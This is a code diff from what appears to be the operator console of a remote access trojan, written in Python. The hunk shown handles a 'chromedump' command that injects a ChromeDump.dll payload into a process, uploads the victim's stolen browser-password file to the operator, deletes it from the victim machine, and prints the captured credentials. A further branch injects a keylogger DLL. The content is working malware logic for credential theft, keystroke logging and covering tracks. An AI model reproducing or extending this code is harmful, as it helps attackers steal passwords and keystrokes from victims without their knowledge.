@@ -644,10 +644,15 @@ Open Ports
                 elif(main == "chromedump"):
                     # print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                     DLLTransfer("payloads/ChromeDump.dll", setting('inject_process')) # Inject ChromeDump.dll
-                    self.SendData("fupload:passwords.txt")
+                    credfile = hostList[location].split("/")[0]
+                    self.SendData("fupload:"+credfile)
                     time.sleep(2)
-                    self.SendData("delete:passwords.txt")
+                    self.SendData("delete:"+credfile)
                     self.WaitForReply()
+                    print("-------------------------")
+                    PrintTextFile("downloads/"+credfile)
+                    print("-------------------------")
+                    print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Saved in 'downloads/"+credfile+"'")
 
                 elif(main == "keylog_start"):
                     DLLTransfer("payloads/keylogger.dll", setting('inject_process'))
@@ -667,7 +672,7 @@ Open Ports
                         os.remove("downloads/log.log")
                     except FileNotFoundError:
                         print("[X] No Logs were written.")
-                        
+
             except KeyboardInterrupt:
                 print("[X] Interrupt, Type exit to Exit session.")
 
